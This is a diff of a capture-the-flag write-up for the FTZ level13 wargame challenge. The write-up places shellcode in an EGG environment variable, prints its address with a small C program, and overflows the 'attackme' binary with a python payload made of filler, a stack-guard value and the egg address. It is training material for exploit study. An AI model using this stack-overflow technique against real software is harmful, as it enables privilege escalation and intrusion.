@@ -220,14 +220,15 @@ As a result of the debug, the attackme in this level has a stack guard and I wil
 main() {
         printf("EGG : %p", getenv("EGG"));
 }
+
 [level13@ftz tmp]$ gcc getegg.c -o getegg
 [level13@ftz tmp]$ ./getegg
 EGG : 0xbffffc8e
 ```
 
-I made the env variable of EGG(shell code) and then made getegg(to get EGG's address).
+I made the env variable of EGG(shell code) and then made and run getegg.c (to get EGG's address).
 
-And I will exploit 1036bytes dummy string + stackguard(\x67\x45\x23\x01) + 12bytes dummy string + the egg's adress(0xbffffc8e)
+And I will exploit with 1036bytes dummy string + stackguard(\x67\x45\x23\x01) + 12bytes dummy string + the egg's adress(0xbffffc8e)
 
 ``` 
 [level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\x8e\xfc\xff\xbf"'`
